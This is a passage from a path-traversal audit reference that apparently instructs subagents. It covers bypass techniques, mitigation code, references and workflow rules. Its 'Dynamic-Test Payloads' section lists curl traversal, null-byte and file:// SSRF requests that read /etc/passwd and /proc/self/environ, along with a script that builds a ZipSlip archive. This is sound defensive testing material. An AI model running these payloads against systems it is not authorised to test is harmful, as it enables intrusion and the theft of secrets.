|---|---|---|
| Overlong UTF-8 slash | `%c0%af` | Decodes to `/` on older JVM / ICU decoders |
| Full-width slash | `%ef%bc%8f` (`／`) | Normalized to `/` by some frameworks |
| NFC/NFKC normalization | `..％2f` (full-width percent) | May normalize to `%2f` then decode |
| Case folding | `..%2F` vs `..%2f` | Filters using lowercase may miss uppercase hex |
| Dotless I / homoglyphs | Filesystem-dependent | Rare, but possible on Unicode-aware volumes |

Subagents must flag the finding even if the bypass is framework-specific; the risk assessment should note the exact runtime.

### Double URL Encoding (`%252e`)

A filter that URL-decodes once leaves `%2e%2e%2f`, which is then decoded by a later layer:

```
%252e%252e%252fetc%252fpasswd
  → layer 1: %2e%2e%2fetc%2fpasswd
  → layer 2: ../etc/passwd
```

Look for frameworks where `request.args` / `req.query` decode automatically while a custom helper decodes again.

### Predictable Temporary Paths

Writing to `/tmp/filename` or `/tmp/upload-filename` without uniqueness allows:

- Symlink attacks: attacker creates `/tmp/target` as a symlink to `/etc/cron.d/job`; the application overwrites the sensitive file.
- Race conditions between file creation and opening.

Use `mkstemp()`, `tempfile.NamedTemporaryFile()`, or equivalent with random suffixes and restrictive permissions.

### TOCTOU / Race Conditions

Time-of-check to time-of-use issues occur when:

1. The application checks `realpath(path).startswith(base)`.
2. An attacker replaces `path` with a symlink to `/etc/passwd` between the check and the open.
3. The application opens the symlink and reads the sensitive file.

Mitigations:
- Use `O_NOFOLLOW` (`open(..., O_NOFOLLOW)`) or equivalent.
- Perform the check and open atomically where the OS supports it.
- Avoid predictable paths in shared directories.

### Path Normalization Differences Across OS / Frameworks

The same path string may resolve differently depending on the OS and framework:

| Platform | Behavior to watch |
|---|---|
| Windows | `C:\base\..\etc\passwd` resolves outside base; `\` and `/` are equivalent; `C:passwd` is relative to current directory on drive C. |
| macOS / HFS+ | Case-insensitive and Unicode-normalized by default. |
| Linux ext4 | Case-sensitive; trailing dots and spaces are preserved. |
| Java `Paths.get(base).resolve(user)` | `resolve` on an absolute user path ignores `base`. |
| Go `filepath.Clean` | Removes `..` but does not follow symlinks; combine with absolute-prefix check. |
| Node `path.resolve` | Resolves absolute paths; use `path.resolve(base, input)` and prefix check. |
| Python `os.path.join` | Ignores base if input is absolute. |

Subagents must consider the deployment OS and framework when evaluating mitigations.

### Template / Include Path Traversal

Template engines and include directives often resolve paths relative to a template root. User input in the template name can escape that root:

```php
$tpl = $_GET['tpl'];
include("templates/$tpl.php");
# ?tpl=../admin/config
```

```python
# Jinja2 — dynamic template selection
return render_template(request.args.get('page'))
# ?page=../../secret.txt
```

Flag when:
- The template name comes from a request parameter.
- The include path is built from user input.
- The framework does not restrict template lookup to the configured directory.

---

## Dynamic-Test Payloads

Use the following payloads during dynamic confirmation. Replace `../../../etc/passwd` with the target file for the platform (`C:\Windows\win.ini` on Windows, `/proc/self/environ` on Linux containers, `web.config` for .NET).

### Basic traversal

```bash
curl -i "https://target.example/download?file=../../../etc/passwd"
curl -i "https://target.example/download?file=..%2f..%2f..%2fetc%2fpasswd"
curl -i "https://target.example/files/..%2f..%2fetc%2fpasswd"
```

### Encoded and double-encoded variants

```bash
curl -i "https://target.example/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -i "https://target.example/download?file=%252e%252e%252fetc%252fpasswd"
curl -i "https://target.example/download?file=....//....//....//etc/passwd"
```

### Absolute path

```bash
curl -i "https://target.example/download?file=/etc/passwd"
curl -i "https://target.example/download?file=C:%5CWindows%5Cwin.ini"
```

### Null-byte truncation (legacy runtimes)

```bash
curl -i "https://target.example/download?file=../../../etc/passwd%00.jpg"
```

### file:// SSRF

```bash
curl -i "https://target.example/fetch?url=file:///etc/passwd"
curl -i "https://target.example/fetch?url=file://localhost/proc/self/environ"
```

### Archive traversal (ZipSlip)

Create a malicious zip:

```bash
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('slip.zip', 'w') as zf:
    zf.writestr('../../../tmp/pwned.txt', 'owned')
PY

curl -F "file=@slip.zip" https://target.example/upload
# Then verify whether /tmp/pwned.txt was created.
```

### Template / include traversal

```bash
curl -i "https://target.example/page?tpl=../admin/config"
curl -i "https://target.example/render?page=../../secret.txt"
```

### Cloud-storage object-key traversal

```bash
curl -i "https://target.example/s3-proxy?key=uploads/123/../../private-object"
```

When testing, prefer starting with a small number of `../` sequences and increase until the response length or status changes. Record every payload and response in the finding's dynamic-test block.

---

## How to Prevent

Defenses must be applied **before** the file operation and must operate on the fully resolved path. A single layer is rarely enough; combine multiple controls.

### 1. Resolve Canonical Paths and Verify Base-Directory Prefix

The most robust defense is to obtain the real, absolute path (resolving symlinks and `..` sequences) and verify it remains under the intended base directory.

```python
import os
BASE = os.path.realpath('/var/www/files')
resolved = os.path.realpath(os.path.join(BASE, user_input))
if not resolved.startswith(BASE + os.sep):
    raise PermissionError('Path escape detected')
```

```java
Path base = Paths.get("/var/www/files").toRealPath();
Path resolved = base.resolve(userInput).normalize().toRealPath();
if (!resolved.startsWith(base)) {
    throw new SecurityException("Path escape");
}
```

```csharp
var basePath = Path.GetFullPath("/var/www/files");
var resolved = Path.GetFullPath(Path.Combine(basePath, file));
if (!resolved.StartsWith(basePath + Path.DirectorySeparatorChar))
    throw new UnauthorizedAccessException("Path escape");
```

Cautions:
- Use `toRealPath()` / `GetFullPath()` / `realpath()` rather than `normalize()` alone; only real path resolution follows symlinks.
- Include a trailing path separator in the prefix check to avoid `/base-evil` matching `/base`.
- Be aware of TOCTOU between the check and the open; use `O_NOFOLLOW` or atomic APIs where possible.

### 2. Use `basename()` / `GetFileName()` When Only a Filename Is Needed

If the business logic only needs a filename, strip all directory components before joining:

```python
filename = os.path.basename(user_input)
safe = os.path.join(BASE, filename)
```

```csharp
var filename = Path.GetFileName(user_input);
var safe = Path.Combine(basePath, filename);
```

Trade-off: this prevents subdirectory access. If subdirectories are required, use canonical-path validation instead.

### 3. Maintain Strict Allowlists

A fixed set of permitted filenames or IDs is stronger than any filter:

```python
ALLOWED = {'report.pdf', 'manual.txt', 'logo.png'}
if user_input not in ALLOWED:
    abort(400)
```

For IDs that map to files, use an indirect object reference (e.g., database ID → stored filename) and verify ownership before lookup.

### 4. Run File Operations in a Chroot / Jail / Sandbox

Isolate file-handling code in an environment with limited filesystem visibility:

- Linux: `chroot`, containers, `firejail`, seccomp-bpf filters.
- Windows: AppContainers, low-integrity process tokens.
- Cloud: separate storage accounts/buckets per tenant with IAM conditions.

Even if traversal occurs, the process cannot read files outside the sandbox.

### 5. Least-Privilege Process User

Run the application as a dedicated, unprivileged user with read-only access to the files it is supposed to serve. Never run as `root`, `Administrator`, `SYSTEM`, or a user with write access to application code or configuration.

### 6. Use Framework-Provided Safe File-Serving Helpers

Prefer helpers that validate the path internally:

- Python/Flask: `send_from_directory(base, filename)` (raises on traversal).
- Python/Django: `django.views.static.serve` with a restricted root.
- Node.js/Express: `express.static` with a fixed root (do not make the root dynamic).
- Java/Spring: `ServletUriComponentsBuilder` and `ResourceHttpRequestHandler` with configured roots.
- C# ASP.NET Core: `PhysicalFileProvider` with `RequestPath` mapping and `FileServerOptions`.

Still verify that user input is not passed as the *base* directory argument.

### 7. Validate Archive Entry Names

Before extracting any archive, inspect every entry:

```python
import zipfile, os
base = os.path.realpath('/var/www/uploads')
with zipfile.ZipFile(user_zip) as zf:
    for member in zf.namelist():
        target = os.path.realpath(os.path.join(base, member))
        if not target.startswith(base + os.sep):
            raise ValueError(f"ZipSlip detected: {member}")
        if os.path.isabs(member):
            raise ValueError(f"Absolute archive path rejected: {member}")
    zf.extractall(base)
```

Reject:
- Entries starting with `/` or drive letters.
- Entries containing `..` or `..` after URL decoding.
- Entries with null bytes or control characters.
- Symlinks in archives unless explicitly required and validated.

### 8. Logging and Monitoring

Log every file operation that uses user input:

- Request ID, authenticated user/tenant, requested path, resolved canonical path, success/failure.
- Alert on path-escape attempts, repeated `../` sequences, encoded traversal, or access to sensitive files.
- Keep logs on a separate, append-only storage to prevent tampering.

---

## References

### OWASP

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
- [OWASP API1:2023 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
- [OWASP API10:2023 — Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Testing for Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

### CWE

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [CWE-36: Absolute Path Traversal](https://cwe.mitre.org/data/definitions/36.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-94: Improper Control of Code Generation ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)

### Additional

- [Snyk ZipSlip](https://res.cloudinary.com/snyk/image/upload/v1528192501/ZipSlip.pdf)
- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## Important Reminders

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- **Do not modify project source code.** This reference is for detection and reporting only. Subagents must not apply patches, create pull requests, or change files in the codebase. Findings are written to `{{ REPORTS_ROOT }}/12_pathtraversal.md`.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 sinks per subagent**. If there are 1-3 sinks total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sinks' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any file-loading sink where the path has a dynamic component, regardless of origin. Do not attempt to trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is taint analysis + mitigation review**: for each sink found in Phase 1, (a) trace the path variable back to its origin and (b) check whether an effective mitigation prevents escape from the intended directory.
- `os.path.join` and `path.join` alone do **not** prevent traversal — `os.path.join('/base', '../etc/passwd')` resolves to `/etc/passwd`. Only `realpath` + prefix check prevents this.
- Encoded traversal variants (`%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `%2e%2e/`) bypass naive string-match filters; only filesystem-level resolution (`realpath`) handles them reliably.
- `send_from_directory` in Flask is safe by itself (it calls `safe_join` internally) — do not flag it unless user input is also used as the *base directory* argument.
- Archive extraction (ZipSlip) is a path traversal variant: zip/tar entry names can contain `../` sequences. Flag any extraction that uses entry names as output paths without per-entry validation.
- Second-order traversal is possible: a filename stored in the DB from user input may later be used in a file read elsewhere in the codebase. Treat DB-read path values as potentially tainted and trace back to where they were written.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Clean up intermediate files: delete `{{ REPORTS_ROOT }}/12_recon.md` and all `{{ REPORTS_ROOT }}/12_batch_*.md` files after the final `{{ REPORTS_ROOT }}/12_pathtraversal.md` is written.
